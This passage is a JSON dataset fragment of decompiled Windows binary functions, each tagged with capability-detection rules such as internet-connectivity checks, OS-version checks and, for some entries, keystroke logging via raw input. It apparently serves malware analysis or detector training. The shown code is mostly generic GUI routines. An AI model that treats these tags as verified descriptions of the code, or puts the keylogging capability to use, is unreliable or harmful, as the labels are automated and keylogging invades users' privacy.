fcn.0041fc00();\n    return puVar2;\n}\n",
        "token_count": 377
    },
    "004202f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004202f4(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.004202d8();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.00419898();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "0042169c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042169c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00422068": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.00422068(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.00421fb8();\n    if (arg_ch < 1) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.004221f0(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.004059dc();\n            fcn.0040a868();\n            fcn.00405c6c();\n        }\n        else {\n            fcn.0042162c();\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00424468": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424468(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x491b88;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.00404100();\n            fcn.004039ac();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "00424fb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00424fb8(void)\n\n{\n    fcn.00424f20();\n    fcn.00424f3c();\n    return;\n}\n",
        "token_count": 35
    },
    "004250d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004250d4(void)\n\n{\n    fcn.00424f20();\n    fcn.00424f3c();\n    return;\n}\n",
        "token_count": 35
    },
    "004280e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004280e0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041b714();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "00428140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428140(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00427bb4();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00404620();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.00428938();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.00428934();\n    }\n    return;\n}\n",
        "token_count": 344
    },
    "00429a6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429a6c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 102
    },
    "0042a5c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a5c4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x42a5e4;\n        fcn.00429c4c();\n        puStack108 = 0x42a5f3;\n        fcn.00403af4();\n        if (param_2 != 0) {\n            puStack108 = &fcn.0042a5c4::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x42a603;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x4999fc) {\n            var_4h = *0x4999fc;\n        }\n        else {\n            puStack120 = 0x42a630;\n            var_4h = fcn.0042916c();\n        }\n        uStack124 = 0x42a65f;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.00429ebc(0, 0, &fcn.0042a5c4::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 479
    },
    "0042a7e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a7e0(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.00429c5c();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.0042957c(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 368
    },
    "0042a85c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a85c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.004238c0();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.00429c4c();\n            fcn.00429c5c();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042a85c::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42a8c2;\n            var_4h = fcn.00428b08(0, &fcn.0042a85c::var_58h);\n            uStack120 = 0x42a8f4;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.00429ebc(0, *(iVar1 + 0x70), &fcn.0042a85c::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.00428a00();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "0042b47c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042b47c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42b57f;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x499a04;\n    uStack292 = 8;\n    puStack296 = 0x42b4a7;\n    *0x491b8c = sub.kernel32.dll_MulDiv();\n    *0x491b8c = -*0x491b8c;\n    if (**0x494d14 == 1) {\n        puStack296 = 0x42b4bd;\n        cVar1 = fcn.0042b438();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42b4ce;\n            fcn.004055c8();\n        }\n    }\n    puStack296 = 0x42b4da;\n    var_8h = fcn.004216c4();\n    uStack300 = 0x42b537;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.004217a0();\n    cVar1 = fcn.00421a08();\n    if (cVar1 != '\\0') {\n        fcn.00422068();\n        fcn.00421770();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x42b53e;\n    uStack300 = 0x42b536;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 480
    },
    "0042edbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042edbc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0042ecbc();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.kernel32.dll_CreateEventA(in_ECX, -(arg_14h != '\\0'), -(arg_10h != '\\0'), uVar1);\n    *(in_EAX + 4) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 234
    },
    "0043b75c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043b75c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX == *(*0x499c1c + 0x30)) {\n        return -(*0x499c2c != '\\0');\n    }\n    iVar1 = sub.user32.dll_IsIconic();\n    return iVar1;\n}\n",
        "token_count": 86
    },
    "0043c0fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043c0fc(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.004585f8(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 145
    },
    "0043c1ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043c1ac(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.004585f8(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.0043c130(&stack0xfffffffc);\n        iVar3 = fcn.00450254();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.0043c130(&stack0xfffffffc);\n        iVar3 = fcn.00450210();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 194
    },
    "0043c244": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c244(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.004585f8(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x494a00)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 203
    },
    "00441d04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441d04(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00444c1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444c1c(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 82
    },
    "00447168": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447168(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x492624) && (in_AL != *0x492624)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x492628));\n        *0x492624 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0044857c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044857c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x448629;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00407550();\n        fcn.0040dafc();\n        fcn.00404ec4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.00449094();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.004293dc();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.00448648();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x448630;\n    uStack20 = 0x448628;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 381
    },
    "00448780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448780(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0044901c();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.00429a1c();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0044a8b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a8b4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.00404800();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "0044e008": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044e008(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.004585f8();\n        uVar2 = fcn.004585f8(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 119
    },
    "0044e330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0044e330(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x499c84 + 8) != 0) {\n        iVar1 = fcn.0044e1fc(*0x499c84 + 0x10, *(*0x499c84 + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 105
    },
    "0044fbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fbc0(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.004202f4();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x20]) {\n            fcn.00450848();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0044fa2c();\n            }\n            else if (param_2 == in_EAX[0x25]) {\n                in_EAX[0x25] = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00454748": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454748(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0044fbc0();\n    if ((param_2 == *(in_EAX + 0x23c)) && (param_1 == '\\x01')) {\n        *(in_EAX + 0x23c) = 0;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "004547a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004547a0(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00450f68();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.00450f98();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.0040484c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040484c();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0045a1f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045a1f4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.00448634();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.0045a258();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.0045a0d4(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 206
    },
    "0045a27c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0045a27c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.00448634();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0045a0d4(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 172
    },
    "0045a570": {
        "rules": [
